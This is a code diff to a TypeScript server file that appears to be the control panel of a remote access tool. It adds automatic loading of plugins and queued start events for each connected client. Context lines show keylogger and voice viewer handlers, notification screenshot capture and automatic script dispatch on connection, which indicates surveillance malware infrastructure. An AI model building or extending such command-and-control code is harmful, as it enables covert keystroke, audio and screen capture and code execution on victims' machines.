@@ -56,6 +56,7 @@ import {
   loadPluginStateFromDisk,
   savePluginStateToDisk,
   sendPluginBundle,
+  dispatchAutoLoadPlugins,
 } from "./server/plugin-state-bundle";
 import {
   DISCONNECT_TIMEOUT_MS,
@@ -169,7 +170,7 @@ const MAX_HTTP_BODY_BYTES = parseMaxHttpBodyBytes();
 const pluginLoadedByClient = new Map<string, Set<string>>();
 const pendingPluginEvents = new Map<string, Array<{ event: string; payload: any }>>();
 const pluginLoadingByClient = new Map<string, Set<string>>();
-let pluginState = { enabled: {} as Record<string, boolean>, lastError: {} as Record<string, string> };
+let pluginState = { enabled: {} as Record<string, boolean>, lastError: {} as Record<string, string>, autoLoad: {} as Record<string, boolean>, autoStartEvents: {} as Record<string, Array<{ event: string; payload: any }>> };
 
 const savePluginState = () => savePluginStateToDisk(PLUGIN_ROOT, PLUGIN_STATE_PATH, pluginState);
 const loadPluginState = async () => {
@@ -345,6 +346,7 @@ async function startServer() {
       isPluginLoaded: notificationPluginHandlers.isPluginLoaded,
       isPluginLoading: notificationPluginHandlers.isPluginLoading,
       enqueuePluginEvent: notificationPluginHandlers.enqueuePluginEvent,
+      drainPluginUIEvents: notificationPluginHandlers.drainPluginUIEvents,
       secureHeaders,
       securePluginHeaders,
       mimeType,
@@ -439,6 +441,17 @@ async function startServer() {
     handleKeyloggerViewerMessage,
     handleVoiceViewerMessage,
     dispatchAutoScriptsForConnection,
+    dispatchAutoLoadPlugins: (info: import("./types").ClientInfo) => {
+      dispatchAutoLoadPlugins(
+        info,
+        pluginState,
+        notificationPluginHandlers.isPluginLoaded,
+        notificationPluginHandlers.isPluginLoading,
+        notificationPluginHandlers.markPluginLoading,
+        notificationPluginHandlers.enqueuePluginEvent,
+        loadPluginBundle,
+      );
+    },
     takePendingNotificationScreenshot: takePendingNotificationScreenshotForClient,
     storeNotificationScreenshot: storeNotificationScreenshotForPending,
     handleNotificationScreenshotResult: notificationPluginHandlers.handleNotificationScreenshotResult,
